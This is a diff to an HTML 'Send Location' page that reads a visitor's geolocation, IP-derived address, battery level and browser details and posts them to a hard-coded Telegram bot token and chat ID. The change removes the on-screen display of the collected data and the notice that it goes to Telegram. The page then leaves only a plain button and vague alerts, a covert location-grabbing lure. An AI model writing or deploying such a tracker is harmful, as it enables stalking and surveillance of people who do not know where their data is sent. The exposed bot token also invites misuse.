@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Location Share</title>
+<title>Send Location</title>
 <style>
   body {
-    background: radial-gradient(circle at center, #001f1f, #000);
+    background: #000;
     color: #00ffff;
     font-family: "Poppins", sans-serif;
     display: flex;
@@ -14,7 +14,6 @@
     align-items: center;
     justify-content: center;
     min-height: 100vh;
-    text-align: center;
   }
   button {
     background: #00ffff;
@@ -31,42 +30,17 @@
     background: #00cccc;
     transform: scale(1.05);
   }
-  .box {
-    background: rgba(0, 30, 30, 0.7);
-    border: 2px solid #00ffff;
-    border-radius: 15px;
-    padding: 20px;
-    width: 85%;
-    max-width: 400px;
-    margin-top: 20px;
-    box-shadow: 0 0 15px #00ffff;
-  }
-  .footer {
-    margin-top: 25px;
-    font-size: 14px;
-    color: #aaa;
-    border-top: 1px solid #00aaaa;
-    padding-top: 5px;
-  }
 </style>
 </head>
 <body>
 
-<h2>📍 Send Your Location</h2>
-<button onclick="sendLocation()">🌐 Share Location</button>
-<div id="info" class="box" style="display:none;"></div>
-<div class="footer">🧠 Developed by D4RK-K1NG</div>
+<button onclick="sendLocation()">📍 Send Location</button>
 
 <script>
 async function sendLocation() {
-  const infoBox = document.getElementById('info');
-  infoBox.style.display = "block";
-  infoBox.innerHTML = "Requesting permission...";
+  if (!navigator.geolocation) return alert("❌ Geolocation not supported.");
 
-  if (!navigator.geolocation) {
-    infoBox.innerHTML = "❌ Geolocation not supported.";
-    return;
-  }
+  alert("📍 Requesting location permission...");
 
   navigator.geolocation.getCurrentPosition(async position => {
     const lat = position.coords.latitude;
@@ -76,9 +50,9 @@ async function sendLocation() {
     let batteryInfo = await navigator.getBattery ? await navigator.getBattery() : null;
     let battery = batteryInfo ? Math.round(batteryInfo.level * 100) + "%" : "N/A";
 
-    let time = new Date();
-    let visitTime = time.toLocaleTimeString();
-    let date = time.toLocaleDateString();
+    let now = new Date();
+    let visitTime = now.toLocaleTimeString();
+    let date = now.toLocaleDateString();
 
     const info = {
       country: ipData.country_name || "Unknown",
@@ -96,24 +70,6 @@ async function sendLocation() {
       userAgent: navigator.userAgent
     };
 
-    // Show on screen
-    infoBox.innerHTML = `
-      🌍 <b>Country:</b> ${info.country}<br>
-      🏙️ <b>State:</b> ${info.state}<br>
-      🌆 <b>City:</b> ${info.city}<br>
-      🏘️ <b>Town:</b> ${info.town}<br>
-      🧾 <b>Pincode:</b> ${info.pincode}<br><br>
-      📡 <b>Latitude:</b> ${info.latitude}<br>
-      🧭 <b>Longitude:</b> ${info.longitude}<br>
-      🗺️ <b>On Map:</b> <a href="${info.map}" target="_blank">View</a><br><br>
-      🕒 <b>Visited Time:</b> ${info.visitTime}<br>
-      📅 <b>Date:</b> ${info.date}<br>
-      🌐 <b>IP:</b> ${info.ip}<br>
-      🔋 <b>Battery:</b> ${info.battery}<br>
-      💻 <b>Used Web:</b> ${info.userAgent}<br>
-    `;
-
-    // Send to Telegram
     const token = "8177299368:AAEq8lA7DsfAM5tkR6kmF5rU-7Po6tuRq68";
     const chatId = "7109583573";
 
@@ -134,24 +90,23 @@ async function sendLocation() {
 🌐 IP: ${info.ip}
 🔋 Battery: ${info.battery}
 💻 Used Web: ${info.userAgent}
+
+🧠 Developed by D4RK-K1NG
 `;
 
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
-      headers: {"Content-Type": "application/json"},
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: chatId,
         text: text,
         parse_mode: "Markdown"
       })
-    }).then(()=> {
-      infoBox.innerHTML += "<br><br>✅ Sent to Telegram successfully!";
-    }).catch(()=> {
-      infoBox.innerHTML += "<br><br>⚠️ Failed to send to Telegram.";
     });
 
+    alert("✅ Location sent successfully!");
   }, () => {
-    infoBox.innerHTML = "❌ Please allow location access to continue.";
+    alert("❌ Please allow location access to continue.");
   });
 }
 </script>
